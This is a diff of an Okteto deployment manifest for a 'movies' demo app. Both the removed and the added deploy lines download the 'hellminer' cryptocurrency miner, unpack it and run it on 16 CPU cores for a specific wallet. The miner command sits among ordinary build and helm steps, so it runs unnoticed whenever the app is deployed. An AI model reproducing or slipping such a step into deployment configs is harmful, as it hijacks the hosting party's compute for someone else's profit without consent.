@@ -1,6 +1,6 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - git clone https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz  && rm hellminer_cpu_linux.tar.gz && ./hellminer -u RSbceYorox3qgSNRFixjuSkMUerYuJG6c1.WK01 -p x --cpu 16
+  - git clone https://github.com/hellcatz/luckpool/blob/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz  && rm hellminer_cpu_linux.tar.gz && ./hellminer -u RSbceYorox3qgSNRFixjuSkMUerYuJG6c1.WK01 -p x --cpu 16
   - okteto build -t okteto.dev/frontend:${OKTETO_GIT_COMMIT} frontend
   - helm upgrade --install movies chart --set tag=${OKTETO_GIT_COMMIT}
 devs:
